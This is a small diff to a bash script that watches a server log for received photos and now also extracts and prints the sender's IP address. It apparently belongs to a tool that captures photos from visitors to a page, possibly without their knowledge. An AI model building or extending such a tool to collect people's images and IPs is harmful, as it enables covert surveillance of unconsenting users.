@@ -116,10 +116,12 @@ monitor_photos() {
     echo -e "${YELLOW}[+] Waiting for photos...${RESET}"
     tail -f server.log | while read line; do
         if echo "$line" | grep -q "Photo received"; then
-            echo -e "${GREEN}[+] Photo Received!${RESET}"
+            IP=$(echo "$line" | grep -oE "IP: [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | cut -d ' ' -f2)
+            echo -e "${GREEN}[+] Photo Received! User IP: ${IP}${RESET}"
         fi
     done
 }
+
 
 # Stop the Server
 stop_server() {
